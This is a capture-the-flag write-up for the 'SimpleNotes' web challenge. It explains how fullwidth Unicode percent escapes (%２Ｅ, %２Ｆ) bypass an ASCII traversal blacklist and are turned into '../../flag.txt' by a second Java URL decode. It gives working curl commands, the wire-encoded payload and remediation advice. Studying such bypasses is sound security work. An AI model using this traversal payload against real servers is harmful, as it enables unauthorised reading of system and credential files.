# SimpleNotes

## Challenge Information

| Field | Value |
| --- | --- |
| Category | Web |
| Points | 433 |
| Author | xzhiyouu |
| Connection | `http://chal.thjcc.org:12024/` |
| Solver | [`solve.py`](solve.py) |
| Artifact | [`artifacts/protocol-transcript.txt`](artifacts/protocol-transcript.txt) |
| Flag | `THJCC{inspired_by_blackhat_asia_2026}` |

> A plain-text notes app. Flag is at `/flag.txt`.

## TL;DR

`/api/read` blocks ASCII traversal strings and their familiar percent-encoded
forms, but it later passes the filename through Java's form URL decoder. That
decoder accepts fullwidth Unicode characters as hexadecimal digits. As a
result, `%２Ｅ` decodes to `.` and `%２Ｆ` decodes to `/`, even though neither
sequence matches an ASCII-only blacklist. Two encoded parent-directory
segments produce `../../flag.txt`, escape the notes directory, and read the
flag from the filesystem root.

## 1. Mapping the Application

The page source contains all of the client-side API logic. It first requests a
list of notes, then reads a selected filename through the `f` query parameter:

```javascript
files = await (await fetch('/api/notes')).json();

const res = await fetch('/api/read?f=' + encodeURIComponent(file));
const text = await res.text();
```

Enumerating the notes gives three ordinary text files:

```bash
curl -sS http://chal.thjcc.org:12024/api/notes
```

```json
["cybersec.txt","learn.txt","ramen.txt"]
```

Reading one confirms the endpoint and parameter:

```bash
curl -sS -G http://chal.thjcc.org:12024/api/read \
  --data-urlencode 'f=ramen.txt'
```

The response contains the ramen note as plain text.

## 2. Fingerprinting the Filter

The challenge states that the flag is at the absolute path `/flag.txt`, so the
natural first attempt is directory traversal:

```bash
curl -i -G http://chal.thjcc.org:12024/api/read \
  --data-urlencode 'f=../../flag.txt'
```

The application rejects it with a distinctive response:

```text
HTTP/1.1 403

u are blocked XD
```

Absolute paths, backslashes, and common single- and double-encoded variants are
also rejected. A more useful observation comes from harmless percent escapes.
If the value contains a literal `%41`, the error reports the resulting `A`:

```text
Input:  abc%41
Error:  note not found: abcA
```

This demonstrates an additional application-side decoding step. The request
parameter has already been decoded by the servlet container, but the
application invokes a form URL decoder again before performing the file read.
The filter recognizes familiar ASCII escapes such as `%2e`, `%2f`, and `%5c`,
so ordinary double encoding is still caught.

## 3. The Unicode Hexadecimal Ambiguity

Java's URL-decoding path converts each `%xy` escape by interpreting `x` and `y`
as hexadecimal digits. That numeric conversion is not limited to ASCII glyphs:
Unicode characters with valid hexadecimal digit values are accepted too.

The useful fullwidth characters are:

| Escape | Numeric bytes | Decoded character |
| --- | --- | --- |
| `%２Ｅ` | `0x2e` | `.` |
| `%２Ｆ` | `0x2f` | `/` |

Here `２`, `Ｅ`, and `Ｆ` are fullwidth Unicode characters, not their ASCII
counterparts. An ASCII-oriented blacklist looking for `%2e` and `%2f` does not
recognize them, while the later Java decoder assigns them the same hexadecimal
values.

We can verify the behavior without attempting traversal. Use `%２Ｅ` in place
of the period in a known note filename:

```bash
curl -sS -G http://chal.thjcc.org:12024/api/read \
  --data-urlencode 'f=ramen%２Ｅtxt'
```

The request succeeds and returns `ramen.txt`. On the wire, curl sends:

```text
f=ramen%25%EF%BC%92%EF%BC%A5txt
```

The servlet layer converts `%25` back to a literal percent sign and decodes the
UTF-8 fullwidth characters. The application's later decoder then interprets
the surviving `%２Ｅ` as byte `0x2e`.

## 4. Building the Traversal

One parent-directory segment can now be represented without a literal dot or
slash:

```text
%２Ｅ%２Ｅ%２Ｆ  ->  ../
```

A single segment reaches only the parent of the notes directory and returns:

```text
note not found: ../flag.txt
```

Two segments reach the filesystem root, where the challenge description says
the flag is stored:

```text
%２Ｅ%２Ｅ%２Ｆ%２Ｅ%２Ｅ%２Ｆflag.txt
               |
               +-- application-side decoding --> ../../flag.txt
```

The complete exploit is one request:

```bash
curl -sS -G 'http://chal.thjcc.org:12024/api/read' \
  --data-urlencode 'f=%２Ｅ%２Ｅ%２Ｆ%２Ｅ%２Ｅ%２Ｆflag.txt'
```

Response:

```text
THJCC{inspired_by_blackhat_asia_2026}
```

For reference, the fully encoded query parameter sent over HTTP is:

```text
f=%25%EF%BC%92%EF%BC%A5%25%EF%BC%92%EF%BC%A5%25%EF%BC%92%EF%BC%A6%25%EF%BC%92%EF%BC%A5%25%EF%BC%92%EF%BC%A5%25%EF%BC%92%EF%BC%A6flag.txt
```

## 5. Automated Solver

[`solve.py`](solve.py) constructs the Unicode payload, lets `urlencode` produce
the correct UTF-8 wire representation, sends the request, and extracts the
flag. It uses only Python's standard library:

```bash
python3 solve.py
```

Expected output:

```text
[+] payload: %２Ｅ%２Ｅ%２Ｆ%２Ｅ%２Ｅ%２Ｆflag.txt
[+] flag: THJCC{inspired_by_blackhat_asia_2026}
```

## Why It Works

The validation and interpretation layers disagree about the alphabet allowed
inside a percent escape. The validator reasons about ASCII strings, while the
decoder reasons about Unicode digit values. A string judged harmless by the
first layer is transformed into traversal syntax by the second.

The vulnerability is made exploitable by three design decisions:

1. The application decodes an already-decoded request parameter again.
2. It uses a blacklist instead of enforcing a safe filename grammar.
3. It reads the resulting path without verifying that its normalized target
   remains beneath the notes directory.

## Remediation

- Decode input exactly once at the request boundary.
- Permit only expected note filenames, for example a strict ASCII basename
  ending in `.txt`, instead of blacklisting traversal spellings.
- Resolve the requested file against the notes root, normalize it, and reject
  it unless the result starts with the normalized notes-root path.
- Resolve symbolic links with `toRealPath()` and repeat the containment check
  on the real target when symlinks may exist.
- Prefer opaque server-generated note identifiers over caller-controlled
  filesystem paths.

## Flag

```text
THJCC{inspired_by_blackhat_asia_2026}
```
